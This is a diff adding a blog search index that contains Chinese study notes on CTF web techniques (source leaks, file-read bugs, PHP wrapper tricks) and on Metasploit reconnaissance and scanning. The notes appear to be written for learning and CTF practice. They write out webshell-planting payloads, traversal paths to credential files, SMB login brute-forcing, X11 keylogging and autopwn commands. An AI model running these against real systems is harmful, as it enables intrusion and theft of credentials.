@@ -1,0 +1,1226 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>从0到1：CTFer成长之路-第一章 Web入门</title>
+    <url>/2023/05/26/%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF/%E4%BB%8E0%E5%88%B01%EF%BC%9ACTFer%E6%88%90%E9%95%BF%E4%B9%8B%E8%B7%AF-%E7%AC%AC%E4%B8%80%E7%AB%A0%20Web%E5%85%A5%E9%97%A8/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="0x00-信息收集"><a href="#0x00-信息收集" class="headerlink" title="0x00 信息收集"></a>0x00 信息收集</h3><h4 id="1-分类"><a href="#1-分类" class="headerlink" title="1. 分类"></a>1. 分类</h4><h6 id="1-1敏感目录泄露"><a href="#1-1敏感目录泄露" class="headerlink" title="1.1敏感目录泄露"></a>1.1敏感目录泄露</h6><p>（1）git泄露</p>
+<ol>
+<li>常规git 泄露<br> 参赛者通过运用现成工具或者编写的脚本即可获取网站源码或flag</li>
+<li>git回滚<br> 当题目存在git 泄露时，flag（敏感）文件可能在修改中被删除或覆盖了，利用git reset命令来恢复到以前的版本。除了使用 git reset，更简单的方式是通过 git log-stat 命令查看每个commit修改了哪些文件，再用git diff HEAD commit-id 比较在当前版本与想查看的commit 之间的变化。</li>
+<li>git 分支<br> 可以使用git log 查看在当前分支上的修改，现在大多数现成的git泄露工具都不支持分支，有一款叫GitHacker的工具可以使用，链接是：<img src="https://github.com/WangYihang/GitHacker" alt="https://github.com/WangYihang/GitHacker">。使用时执行命令<code>python GitHacker.py http://127.0.0.1:8000/.git/</code>。运行后，我们在本地可以看到生成的文件夹，进入后执行git log –all 或者git branch -v ，只能看到master分支的信息。如果执行git reflog 命令，就可以看到一些checkout 的记录。</li>
+<li>git 泄露的其他利用<br> 如.git&#x2F;config 文件夹中可能含有access_token信息，从而访问这个用户的其他仓库。<br> （2） SVN泄露<br> SVN也是源代码版本管理软件，造成SVN源代码漏洞的主要原因是管理员操作不规范将SVN隐藏文件夹暴露在外网环境，可以利用.svn&#x2F;entries或者wc.db文件获取服务器源码等信息。推荐工具：<a href="https://github.com/kost/dvcs-ripper,Seay-svn%E3%80%82">https://github.com/kost/dvcs-ripper,Seay-svn。</a><br> （3）HG泄露<br> 在初始化项目时，HG会在当前文件夹下创建一个.hg隐藏文件夹，其中包含代码和分支修改记录等信息。推荐工具: <a href="https://github.com/kost/dvcs-ripper%E3%80%82">https://github.com/kost/dvcs-ripper。</a><br> （4)总结经验<br> CTF线上比赛往往会有重定向问题，只要访问.git，便会返回403，此时试探访问.git&#x2F;config，如果有文件内容返回，就说明存在git泄露，反之不存在。</li>
+</ol>
+<h6 id="1-2-敏感备份文件"><a href="#1-2-敏感备份文件" class="headerlink" title="1.2 敏感备份文件"></a>1.2 敏感备份文件</h6><p>（1）gedit备份文件<br>    在linux中，用gedit编辑器保存后，当前目录下会生成一个后缀为“<del>”的文件，其内容就是刚编辑的内容，假设刚才保存的文件名为flag，则该文件名为flag</del>，通过浏览器访问即可得到源码。<br>（2）vim 备份文件<br>    当用户使用vim编辑时，如果意外退出，会在当前目录下生成一个备份文件，文件格式为 .文件名.swp，该文件用来备份缓冲区中的内容即退出时的文件内容，针对这个备份文件，我们可以使用 vim -r 命令恢复文件的内容。<br>（3）常规文件<br>    包括 <code>robots.txt ，readme.md ，www.zip/rar/tar.gz</code> 等文件，主要要依靠字典的强度。<br>（4）总结经验<br>    在CTF线上比赛中，出题人往往会在线运维题目，有时会因为各种情况导致SWP备份文件的生成，所以在比赛过程中可以编写实时监控脚本，对题目服务进行监控。<br>    vim 在第一次意外退出时生成备份文件*.swp，第二次为*.swo，第三次为*.swn，以此类推，vim官方文档中还有*.un.文件名.swp类型的备份文件。<br>    在实际环境中，网站的备份往往是网站域名的压缩包。</p>
+<h6 id="1-3-Banner识别"><a href="#1-3-Banner识别" class="headerlink" title="1.3 Banner识别"></a>1.3 Banner识别</h6><p> 一个网站的banner信息（服务器对外显示的一些基础信息）对解题有很重要的作用，也可以叫指纹，包括一些CMS框架的漏洞，可以网上直接搜索利用。<br>（1）自行搜集指纹库<br>    Github中有大量成型公开的CMS指纹库，包括一些扫描的工具。<br>（2）使用已有的工具<br>    例如 Wappalyer工具，不仅有python版，还有浏览器插件<br>（3）总结经验<br>    在进行服务器的Banner信息探测时，除了通过上述两种常见的识别方式，可以尝试随意输入一些URL，有时可以通过错误信息显示更多的信息。</p>
+<h3 id="0x01-CTF中的SQL注入"><a href="#0x01-CTF中的SQL注入" class="headerlink" title="0x01 CTF中的SQL注入"></a>0x01 CTF中的SQL注入</h3><p> SQL 注入之前专门写过，请移步到 <a href="http://limbus.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/">http://limbus.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/</a></p>
+<h3 id="0x02-任意文件读取漏洞"><a href="#0x02-任意文件读取漏洞" class="headerlink" title="0x02 任意文件读取漏洞"></a>0x02 任意文件读取漏洞</h3><p> 所谓文件读取漏洞，就是攻击者通过一些手段可以读取服务器上开发者不允许读到的文件。从整个攻击过程看，是信息收集的补充。</p>
+<h4 id="1-文件读取漏洞常见触发点"><a href="#1-文件读取漏洞常见触发点" class="headerlink" title="1. 文件读取漏洞常见触发点"></a>1. 文件读取漏洞常见触发点</h4><h6 id="1-1Web语言"><a href="#1-1Web语言" class="headerlink" title="1.1Web语言"></a>1.1Web语言</h6><p>（1）PHP<br> PHP中有关文件读的文件包括但不限于：file_get_contents()、file()、fopen()函数（及其文件指针操作函数fread()、fgets()等），与文件包含相关的函数（include()、require()、include_once()、require_once()等），以及通过PHP读文件的执行系统命令(system()、exec()等)。<br> 除了上面提到的标准库函数，很多常见的PHP扩展也提供了一些可以读取文件的函数，例如，php-curl扩展（文件内容作为HTTP body）涉及文件存取的库（如数据库相关扩展、图片相关扩展）、XML模块造成的XXE等。<br> 与其他语言不同，PHP向用户提供的指定待打开文件的方式不是简单的一个路径，而是一个文件流。我们可以将其简单理解成PHP提供的一套协议。在PHP中有很多功能不同但形式相似的协议，统称为Wrapper，其中最具特色的协议便是php:&#x2F;&#x2F;协议，而且PHP提供了接口供开发者编写自定义的wrapper。除了wrapper，PHP中另一个具有特色的机制是Filter，其作用是对目前的wrapper进行一定的处理（如把当前文件流的内容全部变为大写）。<br> 假设服务端的include 函数的路径参数可控，正常情况下它会将目标文件当作PHP文件去解析，如果解析文件存在<code>&lt;?php</code>等PHP的相关标签，那么标签内就会被当作PHP代码执行。<br> 如果将这种含有PHP代码的文件的文件名传入include函数，那么由于PHP代码被执行而无法通过可视文本的形式泄露，但这时可以通过使用Filter避免这种情况的发生。<br> 例如比较常见的Base64相关的Filter可将文件流编码成Base64的形式，这样读取的文件内容中就不会存在PHP标签，而更严重的是，如果服务端开启了远程文件包含选项allow_url_include，我们就可以直接执行远程PHP代码。PHP默认的Wrapper和Filter都可以通过php.ini禁用。<br> 在遇到的有关PHP文件包含的实际问题中，我们可能遇到三种情况<br>     1. 文件路径前面可控，后面不可控：在较低的PHP版本及容器版本中可以使用“\x00”截断，对应的URL编码是%00.当服务端存在文件上传功能时，也可尝试利用zip或phar协议直接进行文件包含进而执行PHP代码。<br>     2. 文件路径后面可控，前面不可控：可以通过符号“..&#x2F;”进行目录穿越来直接读取文件，但这种情况无法使用wrapper，如果服务端是利用include等文件包含类的函数，我们将无法读取php文件中的PHP代码。<br>     3. 文件路径中间可控：和第一种情况类似，但是无法利用wrapper进行文件包含。<br>（2）Python<br> 与PHP不同的是，Python的Web应用更多地倾向于通过其自身的模块启动服务，同时搭配中间件、代理服务将整个Web应用呈现给用户。<br> 漏洞经常出现在框架请求静态资源文件部分，也就是最后读取文件内容的open函数，但直接导致漏洞的成因往往是框架开发者忽略了Python函数的feature，如os.path.join()。很多开发者会判断用户传入的路径不包含.来保证在读取资源时不会发生目录穿越，随后用户的输入代入os.path.join()的第二个参数，但如果用户传入“&#x2F;”，则依然可以穿越到根目录，导致任意文件读取。 CTF中，python开发者调用不安全的解压模块进行文件压缩，而导致文件解压后可进行目录穿越，可以覆盖服务器已有文件。  还有一种情况是攻击者构造软链接放入压缩包，解压后的内容会直接指向服务器相应文件。<br>（3）Java<br> 除了Java本身的文件读取函数FileInputStream、XXE导致的文件读取，Java的一些模块也支持file:&#x2F;&#x2F;协议，这是Java应用中出现任意文件读取最多的地方，如Spring Cloud Config Server路径穿越与任意文件读取漏洞（CVE-2019-3799）、Jenkins任意文件读取漏洞（CVE-2018-199902）等。<br>（4）Ruby<br> CTF中，Ruby的任意文件读取漏洞通常与Rails 框架相关，到目前为止，我们已知的通用漏洞为 Ruby On Rails远程代码执行漏洞（CVE-2016-0752）、Ruby On Rails路径穿越与任意文件读取漏洞（CVE-2018-3760）、(CVE-2019-5418)。<br>（5）Node<br> 目前已知的Node.js的express模块曾存在任意文件读取漏洞（CVE-2017-14849）,CTF中Node的文件读取漏洞通常为模板注入、代码注入等。</p>
+<h6 id="1-2-中间件-x2F-服务器相关"><a href="#1-2-中间件-x2F-服务器相关" class="headerlink" title="1.2 中间件&#x2F;服务器相关"></a>1.2 中间件&#x2F;服务器相关</h6><p>（1）Nginx错误配置<br> 常与Python-Web应用一起出现，因为Nginx一般被视为Python-Web反向代理的最佳实现。如果它的配置文件粗偶，就容易造成严重问题，例如<br> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">location /static&#123;</span><br><span class="line"> alias /home/myapp/static/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br> 如果配置文件包含上面这段话，很可能是运维或开发人员想让用户可以访问static目录。但是如果用户请求的web路径是&#x2F;static..&#x2F;，拼接到alias上就变成了&#x2F;home&#x2F;myapp&#x2F;static&#x2F;..&#x2F;，此时便会产生目录穿越漏洞，并且穿越到了myapp目录。这时，攻击者可以任意下载python源代码和字节码文件。漏洞的成因是location最后没有加“&#x2F;”限制。<br>（2）数据库<br> 可以对文件进行读取操作的数据库很多，以MySQL为例。<br> MySQL的load_file()函数可以文件读取，但是要首先数据库配置FILE权限（root用户一般有），其次需要执行load_file()函数的MySQL用户对于目标文件具有可读权限，主流Linux系统还需Apparmor配置目录白名单。<br> 还有一种方式，这种方式需要执行完整的SQL语句，即load data infile。需要FILE权限，比较少见。<br>（3）软连接<br> bash 命令 ln -s 可以创建一个指向文件的软链接文件，然后将这个软链接文件上传至服务器，当我们再次请求访问这个链接文件时，实际上是请求在服务端它指向的文件。<br>（4）FFmpeg<br> FFmpeg被爆出存在任意文件读取漏洞。<br>（5）Docker-API<br> Docker-API可以控制Docker的行为，Docker-API通过UNIX Socket通信，也可以通过HTTP直接通信，当我们遇见SSRF漏洞时，尤其是可以通过SSRF漏洞进行UNIX Socket通信时，就可以通过操纵Docker-API把本地文件载入Docker新容器进行读取。</p>
+<h6 id="1-3-客户端相关"><a href="#1-3-客户端相关" class="headerlink" title="1.3 客户端相关"></a>1.3 客户端相关</h6><p>  客户端也存在文件读取漏洞，大多数是基于XSS漏洞读取本地文件。<br>（1）浏览器&#x2F;Flash XSS<br> 一般来说，很多浏览器会禁止JavaScript代码读取本地文件相关操作，如请求一个远程网站，如果它的JS代码中使用File协议读取客户的本地文件，那么此时会由于同源策略导致读取失败。但有例外，Safari浏览器有一个客户端的本地文件读取漏洞。<br>（2）MarkDown语法解析器XSS<br> 与XSS相似，MarkDown解析器也具有一定的解析JS的能力，但是这些解析器大多没有像浏览器一样本地文件读取的操作进行限制，很少有与同源策略类似的防护措施。</p>
+<h4 id="2-文件读取漏洞常见读取路径"><a href="#2-文件读取漏洞常见读取路径" class="headerlink" title="2.文件读取漏洞常见读取路径"></a>2.文件读取漏洞常见读取路径</h4><h6 id="2-1-Linux"><a href="#2-1-Linux" class="headerlink" title="2.1 Linux"></a>2.1 Linux</h6><p>（1）flag名称（相对路径）<br> 比赛过程中，有时爆破一下flag名称便可得到答案<br><img src="https://cdn.jsdelivr.net/gh/H-Limbus/myBlogImage@LoadImg/img/202305211938966.png" alt="image.png"><br>（2）服务器信息（绝对路径）<br> 下面列出CTF线上赛中常见的部分需知目录和文件。<br>    1. &#x2F;etc目录：多是各种应用或系统配置文件，所以其下的文件是进行文件读取的首要目标。<br>    2. &#x2F;etc&#x2F;passwd：是Linux系统保存用户信息及其工作目录的文件，权限是所有用户&#x2F;组可读。<br>    3. &#x2F;etc&#x2F;shadow：是Linux系统保存用户信息及（可能存在）的密码（hash）的文件，权限是root用户可读写、shadow组可读，一般不可读。<br>    4. &#x2F;etc&#x2F;apache2&#x2F;*：是Apache配置文件，可以获取Web目录、服务端口等信息。<br>    5. &#x2F;etc&#x2F;nginx&#x2F;*：是Nginx配置文件（Ubuntu等系统），可以获知Web目录、服务端口等信息。<br>    6. &#x2F;etc&#x2F;apparmor(.d)&#x2F;*：是Apparmor配置文件，可以获知各应用系统调用的白名单、黑名单。例如通过读配置文件查看MySQL是否禁止了系统调用，从而确定是否可以使用UDF(User Denfined Functions)执行系统命令。<br>    7. &#x2F;etc&#x2F;(cron.d&#x2F;*|crontab)：是定时任务文件，有些CTF题目会设置一些定时任务，读取这些配置文件就可以发现隐藏的目录或其他文件。<br>    8. &#x2F;etc&#x2F;environment：是环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露情况。<br>    9. &#x2F;etc&#x2F;hostname：表示主机名<br>    10. &#x2F;etc&#x2F;hosts：是主机名查询静态表，包含指定域名解析IP的成对信息。可以探测网卡信息和内网IP&#x2F;域名。<br>    11. &#x2F;etc&#x2F;issue：指明系统版本<br>    12. &#x2F;etc&#x2F;mysql&#x2F;*：是MySQL配置文件。<br>    13. &#x2F;etc&#x2F;php&#x2F;*：是PHP配置文件。<br>    14. &#x2F;proc目录：通常存储进程动态运行的各种信息，本质上是一种虚拟目录。如果要查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需&#x2F;proc&#x2F;self代替&#x2F;proc&#x2F;[pid]&#x2F; 即可。对应目录下的cmdline可读出比较敏感的信息，如使用mysql-uxxx-pxxxx登录MySQL，会在cmdline中显示明文密码。有时我们无法获取当前应用所在的目录，通过cwd命令可以直接跳转到当前目录：&#x2F;proc&#x2F;[pid]&#x2F;cwd&#x2F;，环境变量中可能存在secret_key，这时也可以通过environ进行读取：&#x2F;proc&#x2F;[pid]&#x2F;environ<br>    15. 其他目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nginx配置文件可能存在其他路径:  /usr/local/nginx/conf/*</span><br><span class="line">日志文件:  var/log/\*</span><br><span class="line">Apache默认Web根目录: /var/www/html/</span><br><span class="line">PHP session目录：/var/lib/php(5)/sessions/</span><br><span class="line">用户目录：</span><br><span class="line">  ~/.bash_history(泄露历史执行命令)</span><br><span class="line">  ~/.bashrc（部分环境变量）</span><br><span class="line">  ~/.ssh/id_rsa(.pub)(ssh登录私钥/公钥)</span><br><span class="line">  ~/.viminfo （vim使用记录）。</span><br></pre></td></tr></table></figure>
+
+<h6 id="2-2-Windows"><a href="#2-2-Windows" class="headerlink" title="2.2 Windows"></a>2.2 Windows</h6><p>windows 系统下的web应用任意文件读取漏洞在CTF赛题中不常见，但windows与PHP搭配使用有个问题：可以使用<code>&lt;</code>等符号作为通配符，从而在不知道完整名的情况下进行文件读取。<br>补充：include()，和 include_once()、require()、require_once()函数，当访问到的php文件中包含这两个函数时，可能会有文件包含漏洞，file:&#x2F;&#x2F;文件协议，访问  <a href="https://www.xxxxx.com/upload.php?show=file://D:/WWW/123.txt">https://www.xxxxx.com/upload.php?show=file://D:/WWW/123.txt</a>  这种形式，只要知道准确路径，就可以任意读取文件。file:&#x2F;&#x2F;协议在读取本地文件时不需要allow_url_fopen和allow_url_include参数开启，如果读取网络文件需要开启。<code>file://http:xxx/a.php</code>。这几个函数也会将不是php的文件当作php执行。<br>php伪协议。作用是访问各个输入输出流，常用的是php:&#x2F;&#x2F;filter 和php:&#x2F;&#x2F;input，前者用来读取源码，后者用来执行代码。当enctype&#x3D;”multipart&#x2F;form-data”的时候，php:&#x2F;&#x2F;input是无效的。php:&#x2F;&#x2F;filter各个参数：<br><img src="https://cdn.jsdelivr.net/gh/H-Limbus/myBlogImage@LoadImg/img/202305241139095.png" alt="image.png"><br><a href="https://localhost/update.php?file=php://filter/convert.base64-encode/resource=./shell.txt">https://localhost/update.php?file=php://filter/convert.base64-encode/resource=./shell.txt</a>          –例子，将shell.txt中的内容用base64编码输出，如果shell.txt中已经是base64编码，可以使用php:&#x2F;&#x2F;filter&#x2F;convert.base64-decode&#x2F;resource&#x3D;.&#x2F;shell.txt将文件解码并将以php执行。<br>php:&#x2F;&#x2F;input，是当Content-Type不等于multipart&#x2F;form-data的时候可以获取原始请求数据的方法。经过测试，发现还需要开启allow_url_include开关，allow_url_fopen开不开启无所谓。请求方式是GET和POST都可以。include()，和 include_once()、require()、require_once()四种函数都可以执行，执行形式看表：<br><img src="https://cdn.jsdelivr.net/gh/H-Limbus/myBlogImage@LoadImg/img/202305250815984.png" alt="image.png"><br>在show参数后面写入php:&#x2F;&#x2F;input，表明读取原始数据，在data数据出写入想要执行的php代码，例如<code>&lt;?php phpinfo();?&gt;</code>查看phpinfo界面，或者<code>&lt;?php fputs(fopen(&quot;1.php&quot;, &quot;w&quot;), &quot;&lt;?php @eval($_GET[cmd]);?&gt;&quot;);?&gt;</code>写入一句话木马。<br>还有一种方法，例如函数中不是include()等函数，而是有<code>eval(file_get_contents(&#39;php://input&#39;));</code>的函数，可以自己创造，在data处直接写php代码即可。如图：<br><img src="https://cdn.jsdelivr.net/gh/H-Limbus/myBlogImage@LoadImg/img/202305250932545.png" alt="image.png"><br>zip:&#x2F;&#x2F;伪协议，这个方法不需要开启allow_url_fopen和allow_url_include参数，我们先向服务器上传一个zip文件，zip文件中包含一个一句话小马，如果服务器不支持上传zip文件，可以将后缀名改成别的，例如jpg这些，在解析的时候还是会当作zip解析的。整个文件的目录结构为upload.zip中有一个shell.php文件，文件中写入一句话：<code>&lt;?php @eval($_GET[&#39;cmd&#39;]);?&gt;</code>，访问方式为：<a href="http://localhost/send.php?show=zip://upload.zip%23shell&cmd=phpinfo()">http://localhost/send.php?show=zip://upload.zip%23shell&amp;cmd=phpinfo()</a>; 其中zip:&#x2F;&#x2F;后面跟着上传的zip文件路径，然后使用%23隔开，%23也就是#号，再后面跟上其中的文件名，使用&amp;获取文件中的参数cmd，输入想要的命令。<br>data: &#x2F;&#x2F;伪协议，这个协议需要同时开启allow_url_fopen和allow_url_include这两个参数，原理是允许将字符串传递给包含函数，使用方法很简单：<code>http://localhost/send.php?show=data:text/plain,&lt;?php phpinfo();?&gt;</code>会返回phpinfo页面。include()，和 include_once()、require()、require_once()四种函数都可以执行。<br>python (Django)静态资源逻辑配置错误导致的文件读取漏洞，php配置的网站目录是按照文件夹的路径访问网站的，但是Django的网站路径可以自己配置，在项目文件夹下面的urls.py文件中，<code>urlpatterns=[re_path(&#39;^login/$&#39;, views.LoginView.as_view(), name=&#39;login&#39;)]</code>在url后面输入&#x2F;login&#x2F;就可访问，但是要访问一些js,css文件的话，自定义又很麻烦， 于是在网站配置的时候可以创建一个static文件夹，将静态文件放到这个文件夹中，而视图界面python文件中views.py中要是配置不得当，不对输入的文件名做检测的话，就会产生漏洞。利用规则<code>path=/static/../../../../../etc/passwd</code>但是如果对文件后缀名进行了过滤，可以访问__pycache__这个文件夹，其中pyc字节码 文件的命名规则是：<code>[module_name]+&quot;.cpython-3+[\d](python3小版本号)+&quot;.pyc&quot;</code>这是原本文件的缓存，获取了pyc字节码文件后，对这个文件进行反编译，审计代码是否存在漏洞。反编译推荐工具uncompyle6，github地址为：<a href="https://github.com/rocky/python-uncompyle6%E3%80%82">https://github.com/rocky/python-uncompyle6。</a></p>
+]]></content>
+      <categories>
+        <category>读书笔记</category>
+        <category>从0到1：CTFer成长之路</category>
+      </categories>
+      <tags>
+        <tag>学习</tag>
+        <tag>网络安全</tag>
+        <tag>读书笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Metasploit渗透测试指南</title>
+    <url>/2023/05/17/Metasploit%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="0x00-情报收集"><a href="#0x00-情报收集" class="headerlink" title="0x00 情报收集"></a>0x00 情报收集</h3><h4 id="1-被动信息收集"><a href="#1-被动信息收集" class="headerlink" title="1. 被动信息收集"></a>1. 被动信息收集</h4><p>在不接触到目标系统的情况下挖掘目标信息。</p>
+<ol>
+<li><p>whois 查询</p>
+<p>msf中也有whois，在外部也可以用whois查询。</p>
+</li>
+<li><p>Netcraft</p>
+<p>是一个网页界面工具，查询网站IP</p>
+</li>
+<li><p>NsLookup</p>
+<p>获取关于服务器的附加信息</p>
+<span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nslookup</span><br><span class="line">&gt;set ty=mx</span><br><span class="line">&gt;secmaniac.net</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="2-主动信息收集"><a href="#2-主动信息收集" class="headerlink" title="2. 主动信息收集"></a>2. 主动信息收集</h4><ol>
+<li><p>nmap 端口扫描</p>
+<p>在metasploit中集成了nmap，甚至可以将nmap的扫描结果保存到msf 数据库中，然后进行查看。</p>
+<p>关于nmap 扫描的用法可以看我的这篇文章。</p>
+</li>
+<li><p>高级Nmap扫描技巧：TCP空闲扫描</p>
+<p>这种扫描能让我们冒充网络上另一台主机的IP地址，扫描之前，需要在网络上定位一台使用递增IP帧标识机制的空闲主机。</p>
+<p>可以使用MSF框架的 scanner&#x2F;ip&#x2F;ipidseq 模块，来寻找能满足TCP空闲扫描要求的空闲主机。RHOST 参数可以使用IP地址段，CIDR(无类型域间选路)地址块（如192.168.1.0&#x2F;24）。</p>
+<p>找到空闲IP主机后，我们尝试在nmap中使用-sI选项指定找到的空闲IP主机对目标进行扫描。</p>
+<p><code>msf6&gt;nmap -PN -sI 192.168.1.109 192.168.1.255</code></p>
+</li>
+<li><p>使用MSF进行端口扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入以下命令查看有哪些端口扫描工具</span><br><span class="line">msf6&gt; search portscan</span><br><span class="line"></span><br><span class="line">下面我们使用msf的SYN端口扫描器对单个主机进行一次简单的扫描</span><br><span class="line">use scanner/portscan/syn</span><br><span class="line">set RHOST 192.168.1.155</span><br><span class="line">set THREADS 50</span><br><span class="line">run </span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="3-针对性扫描"><a href="#3-针对性扫描" class="headerlink" title="3. 针对性扫描"></a>3. 针对性扫描</h4><ol>
+<li><p>服务器消息块协议扫描</p>
+<p>msf可以用smb_version 模块来遍历一个网络，并获取windows系统的版本号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use scanner/smb/smb_version</span><br><span class="line">set RHOSTS 192.168.1.155</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>搜索配置不当的microsoft SQL Server</p>
+<p>配置不当的MSSQL通常是进入目标系统的第一个后门，MSSQL默认监听在TCP端口1433上或者使用随机动态端口。如果使用随机的TCP端口，只需要对UDP端口1434进行查询，便可以知道那个端口。mssql_ping 可以来做这个。由于mssql_ping使用UDP协议，扫描外网时很慢，但扫描内网时较快。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use scanner/mssql/mssql_ping</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 255</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>SSH服务器扫描</p>
+<p>使用ssh_version 模块来识别目标服务器上运行的SSH版本。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use scanner/ssh/ssh_version</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>FTP扫描</p>
+<p>FTP是一种复杂且缺乏安全性的应用层协议。使用ftp_version 模块对ftp扫描</p>
+<p>使用方式和之前一样，扫描出来ftp服务器之后，我们可以使用msf中的 scanner&#x2F;ftp&#x2F;anonymous模块检查这台服务器是否允许匿名用户登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/ftp/anonymous</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>简单网管协议扫描</p>
+<p>简单网管协议扫描(SNMP)通常用于网络设备中，用来报告带宽利用率、冲突率以及其他信息。一些操作系统也包含SNMP服务软件，主要用于提供类似CPU利用率 、空闲内存等其他系统信息。</p>
+<p>msf中包含一个内置的辅助模块 scanner&#x2F;snmp&#x2F;snmp_enum，专用与snmp扫描。</p>
+<p>为了获取管理一台交换机的权限，首先需要找到SNMP团体字符串，利用MSF中的scanner&#x2F;snmp&#x2F;snmp_login模块。</p>
+</li>
+</ol>
+<h3 id="0x01-漏洞扫描"><a href="#0x01-漏洞扫描" class="headerlink" title="0x01 漏洞扫描"></a>0x01 漏洞扫描</h3><p>可以手动扫描，也可以利用一些漏洞扫描工具，NeXpose, Nessus.</p>
+<h4 id="1-基本的漏洞扫描"><a href="#1-基本的漏洞扫描" class="headerlink" title="1. 基本的漏洞扫描"></a>1. 基本的漏洞扫描</h4><p>netcat 获取目标192.168.1.203 的旗标，许多网络服务，一旦连接到它们的服务端口或向它们发送特定指令，就可以获取旗标</p>
+<p><code>nc 192.168.1.203 80</code></p>
+<p>有些可以判断网站的服务器</p>
+<h4 id="2-对于NeXpose-和-Nessus-的介绍"><a href="#2-对于NeXpose-和-Nessus-的介绍" class="headerlink" title="2. 对于NeXpose 和 Nessus 的介绍"></a>2. 对于NeXpose 和 Nessus 的介绍</h4><p>略</p>
+<h4 id="3-专用漏洞扫描器"><a href="#3-专用漏洞扫描器" class="headerlink" title="3. 专用漏洞扫描器"></a>3. 专用漏洞扫描器</h4><ol>
+<li><p>验证SMB登录</p>
+<p>可以使用SMB登录扫描器对于大量主机的用户名和口令进行猜解，扫描动静大，每次登录都会被目标主机记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/smb/smb_login</span><br><span class="line">set RHOSTS 192.168.1.13-155</span><br><span class="line">set SMBUser Administrator</span><br><span class="line">set SMBPass s3cr3t</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>扫描开放的VNC空口令</p>
+<p>VNC（虚拟网络计算）提供了图形化的远程系统访问方式，实现类似与微软的远程桌面。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/vnc/vnc_none_auth</span><br><span class="line">set RHOSTS 192.168.1.155</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>找到VNC服务器之后，可以使用vncviewer连接VNC服务器。</p>
+</li>
+<li><p>扫描开放的X11服务器</p>
+<p>msf 的内置open_x11扫描器与vnc_auth 扫描器类似。该服务器允许用户无需身份认证即可连接，但是不广泛。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use auxiliary/scanner/x11/open_x11</span><br><span class="line">set RHOSTS 192.168.1.0/24</span><br><span class="line">set THREADS 50</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p>找到之后可以使用xspy 工具对目标的键盘输入进行记录。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./xspy -display 192.168.1.123:0 -delay 100</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="4-利用扫描结果进行自动化攻击"><a href="#4-利用扫描结果进行自动化攻击" class="headerlink" title="4. 利用扫描结果进行自动化攻击"></a>4. 利用扫描结果进行自动化攻击</h4><p>msf 中的 Autopwn 工具能够自动选择目标，并利用已开放端口或漏洞扫描结果，对目标进行自动化的渗透攻击。可以利用大多数漏洞扫描器的结果来执行Autopwn。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">演示导入Nessus扫描结果对其进行自动化渗透攻击。使用db_connect 命令创建一个新数据库，并使用db_import 命令导入扫描报告，然后开始运行 db_autopwn 对目标发起攻击（e），显示所有匹配的模块（t），使用反弹shell的攻击荷载（r），根据漏洞选择攻击模块（x），根据开放端口选择攻击模块（p）.如果攻击成功，会返回一个被攻击计算机的控制shell.</span><br><span class="line">db_connect postgres:toor@127.0.0.1/msf6</span><br><span class="line">db_import /root/nessus.nbe</span><br><span class="line">db_autopwn -e -t -r -x -p</span><br></pre></td></tr></table></figure>
+
+<h3 id="0x02-渗透攻击之旅"><a href="#0x02-渗透攻击之旅" class="headerlink" title="0x02 渗透攻击之旅"></a>0x02 渗透攻击之旅</h3><h4 id="1-渗透攻击基础"><a href="#1-渗透攻击基础" class="headerlink" title="1. 渗透攻击基础"></a>1. 渗透攻击基础</h4><ol>
+<li><p>show exploits：这个命令会显示msf 框架中所有可用的渗透攻击模块</p>
+</li>
+<li><p>show auxiliary：这个命令会显示所有的辅助模块以及它们的用途，非常广泛，有扫描器、拒绝服务攻击工具、Fuzz测试器</p>
+</li>
